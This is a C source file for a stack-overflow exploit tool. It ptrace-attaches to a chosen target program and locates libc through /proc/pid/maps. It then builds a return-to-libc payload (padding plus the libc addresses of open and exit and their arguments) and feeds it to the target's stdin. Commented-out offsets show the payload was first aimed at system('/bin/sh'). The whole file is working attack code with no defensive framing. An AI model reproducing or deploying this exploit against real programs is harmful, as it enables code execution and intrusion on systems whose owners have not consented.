#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/ptrace.h>
#include <asm/unistd.h>
#include <sys/reg.h>
#include <sys/wait.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define MAX_BUFFLEN     (4096)

static unsigned long exitvaddr = 0x2de10;
//static unsigned long systemvaddr = 0x380b0; // system
//static unsigned long systemvaddr = 0x5ea90; // puts
static unsigned long systemvaddr = 0xbf3e0; // open
//static unsigned long binshvaddr = 0x1243ff;
static unsigned long binshvaddr = 0xcf19;

static uint8_t injected_buffer[MAX_BUFFLEN];

static void ril_unblock_child(pid_t child)
{
	ptrace(PTRACE_DETACH, child, NULL, NULL);
}

/* loop until write(printf) is called, or child has exit */
static int ril_ptrace(pid_t child)
{
	int status;
	long orig_eax;
	long eax;
	int insyscall = 0;
	long params[3];
	while (1) {
		wait(&status);
		if (WIFEXITED(status))
			break;
		orig_eax = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL);
		if (orig_eax == __NR_write) {
			return 1;
		}
		ptrace(PTRACE_SYSCALL, child, NULL, NULL);
	}
	return 0;
}

static FILE *ril_open_map_file(pid_t pid)
{
	FILE *ret;
	char buff[20];

	snprintf(buff, sizeof(buff), "/proc/%u/maps", pid);

	ret = fopen(buff, "r");
	if (ret == NULL) {
		perror("fopen :");
	}
	return ret;
}

static void ril_close_map_file(FILE * fp)
{
	if (fp) {
		fclose(fp);
	}
}

static int ril_matchline_map_file(char *const line)
{
	char useless[128], perm[5];
	unsigned long start_vaddr;
	int ret = 0;

	if (strstr(line, "libc-") == NULL) {
		return 0;
	}

	sscanf(line, "%x-%s %s %s %s %s %s",
	       (unsigned long *)&start_vaddr,
	       useless, perm, useless, useless, useless, useless, useless);
	if (perm[2] == 'x' && perm[0] == 'r') {
		exitvaddr += start_vaddr;
		systemvaddr += start_vaddr;
		binshvaddr += start_vaddr;
		ret = 1;
	}
	return ret;
}

static int ril_read_map_file(FILE * fp)
{
	char line[512];
	int ret = 0;
	if (!fp) {
		return 0;
	}
	while (fgets(line, sizeof(line), fp) && !ret) {
		if (ril_matchline_map_file(line)) {
			printf("tgt_vaddr[system=%lx, binsh=%lx, exit=%lx]\n",
			       systemvaddr, binshvaddr, exitvaddr);
			ret = 1;
		}
	}
	return ret;
}

void ril_make_buffer(pid_t pid, size_t bufflen)
{
	unsigned long *walker, *base;
	uint8_t *maxbnd;
	size_t ulonglen = sizeof(unsigned long);
	size_t i;

	bufflen = (bufflen + (ulonglen - 1)) & ~(ulonglen - 1);
	if (bufflen >= MAX_BUFFLEN || bufflen < 3 * sizeof(unsigned long)) {
		return;
	}
	base   = (unsigned long *)(injected_buffer);
	walker = (unsigned long *)(injected_buffer + bufflen - 3 * ulonglen);

	memset(injected_buffer, 'a', sizeof(unsigned long) * (walker - base));

	*walker++ = (systemvaddr);
	*walker++ = (exitvaddr);
	*walker++   = binshvaddr;
	*walker++   = O_CREAT | O_RDWR;
	memset(walker, 0, 5 * sizeof(*walker));

}

static void ril_prepare_child_pipe(int fdpipe[2])
{
	dup2(fdpipe[0], STDIN_FILENO);
	close(fdpipe[1]);
}

static void ril_prepare_parent_pipe(int fdpipe[2])
{
	close(fdpipe[0]);
	dup2(fdpipe[1], STDOUT_FILENO);
}

static void ril_stop_child_pipe(int fdpipe[2])
{
	close(fdpipe[0]);
}

static void ril_stop_parent_pipe(int fdpipe[2])
{
	close(fdpipe[1]);
}

int main(int argc, char *argv[])
{
	FILE *fp;
	pid_t pid;
	size_t bufflen;
	int fdpipe[2];

	if (argc != 3) {
		fprintf(stderr, "usage : %s <appzname> <buffsize>\n", *argv);
		return -1;
	}

	pipe(fdpipe);

	pid = fork();
	if (pid < 0) {
		perror("fork : ");
		return -1;
	}

	if (pid == 0) {
		ril_prepare_child_pipe(fdpipe);
		ptrace(PTRACE_TRACEME, 0, 0, 0);
		execl(argv[1], argv[1], NULL);
		ril_stop_child_pipe(fdpipe);
//              exit(0);
	} else {
		int ret = ril_ptrace(pid);
		if (ret == 0) {
			fprintf(stderr, "target finished without giving us"
				"opportunity to infect stdin\n");
			return 0;
		}
		fp = ril_open_map_file(pid);
		if (ril_read_map_file(fp)) {
			ril_make_buffer(pid, atoi(argv[2]));
		}
		ril_unblock_child(pid);
		ril_prepare_parent_pipe(fdpipe);
		puts(injected_buffer);
		ril_stop_parent_pipe(fdpipe);
	}

	return 0;
}
